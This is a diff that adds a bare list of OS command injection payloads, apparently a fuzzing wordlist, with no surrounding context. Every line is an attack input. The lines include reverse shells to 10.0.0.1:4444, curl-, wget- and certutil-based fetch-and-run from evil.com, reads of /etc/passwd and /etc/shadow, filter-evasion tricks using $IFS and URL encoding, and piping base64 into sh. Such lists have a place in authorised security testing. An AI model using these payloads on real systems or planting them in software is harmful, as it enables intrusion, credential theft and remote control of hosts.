@@ -1,0 +1,32 @@
+; ls -la
+| cat /etc/passwd
+& whoami
+&& id
+|| uname -a
+`whoami`
+$(whoami)
+; cat /etc/shadow
+| nc -e /bin/sh 10.0.0.1 4444
+; bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+127.0.0.1; ping -c 3 evil.com
+127.0.0.1 && curl http://evil.com/x.sh | sh
+127.0.0.1|wget http://evil.com/shell -O /tmp/s
+;${IFS}cat${IFS}/etc/passwd
+;cat$IFS/etc/passwd
+%3Bid
+%0Aid
+127.0.0.1%0a whoami
+; /bin/cat /etc/passwd
+| /usr/bin/id
+; sleep 10
+| powershell -c "Get-Process"
+& cmd.exe /c dir
+| certutil -urlcache -f http://evil/x.exe x.exe
+; echo dGVzdA== | base64 -d | sh
+`curl evil.com`
+$(curl -s evil.com/x|bash)
+;nslookup evil.com
+a;python -c 'import os;os.system("id")'
+8.8.8.8 || ls /
+x;rm -rf /tmp/x
+|| ping -n 5 127.0.0.1
